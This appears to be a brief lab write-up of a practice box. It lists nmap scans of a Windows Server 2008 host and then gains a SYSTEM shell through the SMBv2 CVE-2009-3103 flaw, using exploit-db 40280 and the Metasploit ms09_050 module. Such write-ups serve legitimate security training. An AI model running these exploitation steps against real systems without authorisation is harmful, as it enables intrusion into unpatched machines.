### Enumeration
```
IP=192.168.158.40
sudo nmap -sU $IP
sudo nmap -p- -vv $IP
sudo nmap -p53,135,139,445,3389,5357,49152,49153,49154,49155,49156,49157,49158 -A $IP
```
### Ports 
- 53
	- Microsoft DNS 6.0.6001 (17714650) (Windows Server 2008 SP1)
- 135
	- RPC
- 139
	- RPC
- 445
	- Windows Server (R) 2008 Standard 6001 Service Pack 1 microsoft-ds (workgroup: WORKGROUP)
- 3389
	- ssl/ms-wbt-server
- 5357
	- Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
- 49152
	- RPC
- 49153
	- RPC
- 49154
	- RPC
- 49155
	- RPC
- 49156
	- RPC
- 49157
	- RPC
- 49158
	- RPC
- OS: Windows 2008
### Foothold
- 445
	- smbclient -N -L //$IP
		- Login successful
		- No shares
	- nmap --script smb-vuln* -p135,139,445 $IP
		- SMBv2 exploit (CVE-2009-3103, Microsoft Security Advisory 975497)  -  vulnerable
			- exploit-db 40280
				- python2 40280.py $IP
					- Needs admin password
				- Adjusted script to have correct LHOST
				- Seems to crash host
			- MS09_050
				- Used msf windows/smb/ms09_050_smb2_negotiate_func_index
				- Now we have a shell as nt auth system
### Lessons Learned
- Check smb for vulnerabilities
- Try using them locally before moving to msf